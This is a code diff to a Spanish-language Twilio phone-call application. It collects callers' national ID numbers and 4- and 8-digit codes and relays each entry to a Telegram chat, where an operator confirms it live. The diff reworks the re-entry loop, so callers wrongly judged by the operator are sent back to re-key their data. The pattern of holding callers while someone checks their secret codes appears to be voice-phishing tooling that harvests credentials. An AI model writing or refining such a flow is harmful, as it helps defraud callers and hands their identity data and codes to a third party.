@@ -281,6 +281,7 @@ def step1():
     response.redirect('/step1')
     return str(response)
 
+# CAMBIO 1: Modificar /save-step1 para mantener el estado de revalidación
 @app.route('/save-step1', methods=['POST'])
 def save_step1():
     digits = request.values.get('Digits')
@@ -296,16 +297,16 @@ def save_step1():
         global_user_sessions[call_sid] = {}
         logger.info(f"🆕 Creada nueva sesión para SID={call_sid}")
     
-    # Verificar si estamos en un proceso de revalidación
-    is_revalidation = 'validacion' in global_user_sessions[call_sid]
+    # Verificar si estamos en un proceso de revalidación INTERMEDIA
+    is_intermediate_revalidation = 'validacion_intermedia' in global_user_sessions[call_sid]
     
     # Guardar la cédula
     global_user_sessions[call_sid]['cedula'] = digits
     
-    # Si había una validación previa, la eliminamos para forzar una nueva validación
-    if is_revalidation and 'validacion' in global_user_sessions[call_sid]:
-        logger.info(f"🔄 Eliminando validación anterior para SID={call_sid}")
-        global_user_sessions[call_sid].pop('validacion', None)
+    # MANTENER el estado de revalidación intermedia si existe
+    if is_intermediate_revalidation:
+        logger.info(f"🔄 Manteniendo estado de revalidación intermedia para SID={call_sid}")
+        # NO eliminamos validacion_intermedia aquí
     
     save_session_to_file(global_user_sessions)
     
@@ -323,14 +324,14 @@ def save_step1():
         logger.info(f"⏱️ Agregando pausa de 3 segundos para cédula de 7 dígitos")
         response.pause(length=3)
     
-    # Si estamos en revalidación, notificar a Telegram y esperar validación
-    if is_revalidation:
+    # Si estamos en revalidación intermedia, notificar a Telegram y continuar al siguiente paso
+    if is_intermediate_revalidation:
         data = global_user_sessions[call_sid]
-        msg = f"🔄 Cédula actualizada:\n🆔 Cédula: {data.get('cedula', 'N/A')} ({digit_length} dígitos)\n🔢 Código 4 dígitos: {data.get('code4', 'N/A')}\n🔢 Código 8 dígitos: {data.get('code8', 'N/A')}\n\nResponde con:\n/validar {call_sid} 1 1 1 (si todos están bien)"
+        msg = f"🔄 Cédula actualizada en revalidación intermedia:\n🆔 Cédula: {data.get('cedula', 'N/A')} ({digit_length} dígitos)\n🔢 Código 4 dígitos: {data.get('code4', 'N/A')}\n\nResponde con:\n/validar2 {call_sid} 1 1 (si ambos están bien)\n/validar2 {call_sid} 1 0 (si la cédula está bien pero el código no)\n/validar2 {call_sid} 0 1 (si la cédula está mal pero el código bien)\n/validar2 {call_sid} 0 0 (si ambos están mal)"
         send_to_telegram(msg)
         
-        response.say("Gracias. Estamos validando su información actualizada. Por favor, espere unos momentos.", language='es-ES')
-        response.redirect(f"/waiting-validation?CallSid={call_sid}&wait=8&revalidation=true")
+        response.say("Gracias. Continuando con la revalidación de sus datos.", language='es-ES')
+        response.redirect(f"/waiting-intermediate-validation?CallSid={call_sid}&wait=8&revalidation=true")
     else:
         # Flujo normal: continuar al siguiente paso
         response.say("Continuando.", language='es-ES')
@@ -363,16 +364,16 @@ def save_step2():
         global_user_sessions[call_sid] = {}
         logger.info(f"🆕 Creada nueva sesión para SID={call_sid}")
     
-    # Verificar si estamos en un proceso de revalidación
-    is_revalidation = 'validacion' in global_user_sessions[call_sid]
+    # Verificar si estamos en un proceso de revalidación INTERMEDIA
+    is_intermediate_revalidation = 'validacion_intermedia' in global_user_sessions[call_sid]
     
     # Guardar el código de 4 dígitos
     global_user_sessions[call_sid]['code4'] = digits
     
-    # Si había una validación previa, la eliminamos para forzar una nueva validación
-    if is_revalidation and 'validacion' in global_user_sessions[call_sid]:
-        logger.info(f"🔄 Eliminando validación anterior para SID={call_sid}")
-        global_user_sessions[call_sid].pop('validacion', None)
+    # MANTENER el estado de revalidación intermedia si existe
+    if is_intermediate_revalidation:
+        logger.info(f"🔄 Manteniendo estado de revalidación intermedia para SID={call_sid}")
+        # NO eliminamos validacion_intermedia aquí
     
     save_session_to_file(global_user_sessions)
     
@@ -381,21 +382,25 @@ def save_step2():
     response = VoiceResponse()
     response.say(f"Ha ingresado {', '.join(digits)}.", language='es-ES')
     
-    # NUEVO: Enviar validación intermedia para los primeros dos datos
+    # Obtener datos para el mensaje
     data = global_user_sessions[call_sid]
     digit_length = len(data.get('cedula', ''))
     
     # Iniciar polling de Telegram si no está activo
     start_telegram_polling()
     
-    # Enviar mensaje de validación intermedia a Telegram
-    msg = f"🔍 <b>VALIDACIÓN INTERMEDIA</b> (Primeros 2 datos):\n🆔 Cédula: {data.get('cedula', 'N/A')} ({digit_length} dígitos)\n🔢 Código 4 dígitos: {data.get('code4', 'N/A')}\n\n<b>Responde con:</b>\n/validar2 {call_sid} 1 1 (si ambos están bien)\n/validar2 {call_sid} 1 0 (si la cédula está bien pero el código no)\n/validar2 {call_sid} 0 1 (si la cédula está mal pero el código bien)\n/validar2 {call_sid} 0 0 (si ambos están mal)"
-    send_to_telegram(msg)
-    
-    if is_revalidation:
-        response.say("Gracias. Estamos validando su información actualizada. Por favor, espere unos momentos.", language='es-ES')
+    # Si estamos en revalidación intermedia, enviar mensaje de revalidación
+    if is_intermediate_revalidation:
+        msg = f"🔄 Código 4 dígitos actualizado en revalidación intermedia:\n🆔 Cédula: {data.get('cedula', 'N/A')} ({digit_length} dígitos)\n🔢 Código 4 dígitos: {data.get('code4', 'N/A')}\n\nResponde con:\n/validar2 {call_sid} 1 1 (si ambos están bien)\n/validar2 {call_sid} 1 0 (si la cédula está bien pero el código no)\n/validar2 {call_sid} 0 1 (si la cédula está mal pero el código bien)\n/validar2 {call_sid} 0 0 (si ambos están mal)"
+        send_to_telegram(msg)
+        
+        response.say("Gracias. Estamos revalidando sus datos actualizados. Por favor, espere unos momentos.", language='es-ES')
         response.redirect(f"/waiting-intermediate-validation?CallSid={call_sid}&wait=8&revalidation=true")
     else:
+        # Flujo normal: enviar mensaje de validación intermedia
+        msg = f"🔍 <b>VALIDACIÓN INTERMEDIA</b> (Primeros 2 datos):\n🆔 Cédula: {data.get('cedula', 'N/A')} ({digit_length} dígitos)\n🔢 Código 4 dígitos: {data.get('code4', 'N/A')}\n\n<b>Responde con:</b>\n/validar2 {call_sid} 1 1 (si ambos están bien)\n/validar2 {call_sid} 1 0 (si la cédula está bien pero el código no)\n/validar2 {call_sid} 0 1 (si la cédula está mal pero el código bien)\n/validar2 {call_sid} 0 0 (si ambos están mal)"
+        send_to_telegram(msg)
+        
         response.say("Estamos validando sus primeros datos. Por favor, espere unos momentos.", language='es-ES')
         response.redirect(f"/waiting-intermediate-validation?CallSid={call_sid}&wait=8&revalidation=false")
     
@@ -496,6 +501,10 @@ def intermediate_validation_result():
             save_session_to_file(global_user_sessions)
         
         if validation == [1, 1]:  # Ambos datos correctos
+            # ELIMINAR el estado de revalidación intermedia solo cuando todo está correcto
+            global_user_sessions[call_sid].pop('validacion_intermedia', None)
+            save_session_to_file(global_user_sessions)
+            
             response.say("Los primeros datos son correctos. Continuemos con el último paso.", language='es-ES')
             response.redirect('/step3')  # Continuar al paso 3
             return str(response)
@@ -503,13 +512,16 @@ def intermediate_validation_result():
             # Mensaje general cuando hay errores en los primeros datos
             response.say("Hemos detectado algunos problemas con los primeros datos proporcionados.", language='es-ES')
             
+            # MANTENER el estado de revalidación intermedia y redirigir al dato incorrecto
+            # NO eliminamos validacion_intermedia aquí
+            
             # Verificar qué dato es incorrecto y redirigir
             if validation[0] == 0:  # Cédula incorrecta
-                logger.info(f"⚠️ REDIRIGIENDO A PASO 1 - CÉDULA INCORRECTA PARA SID={call_sid}")
+                logger.info(f"⚠️ REDIRIGIENDO A PASO 1 - CÉDULA INCORRECTA PARA SID={call_sid} (MANTENER REVALIDACIÓN)")
                 response.say("La cédula ingresada parece ser incorrecta. Por favor, ingrésela nuevamente.", language='es-ES')
                 response.redirect('/step1')
             elif validation[1] == 0:  # Código de 4 dígitos incorrecto
-                logger.info(f"⚠️ REDIRIGIENDO A PASO 2 - CÓDIGO 4 DÍGITOS INCORRECTO PARA SID={call_sid}")
+                logger.info(f"⚠️ REDIRIGIENDO A PASO 2 - CÓDIGO 4 DÍGITOS INCORRECTO PARA SID={call_sid} (MANTENER REVALIDACIÓN)")
                 response.say("El código de 4 dígitos parece ser incorrecto. Por favor, ingréselo nuevamente.", language='es-ES')
                 response.redirect('/step2')
             return str(response)
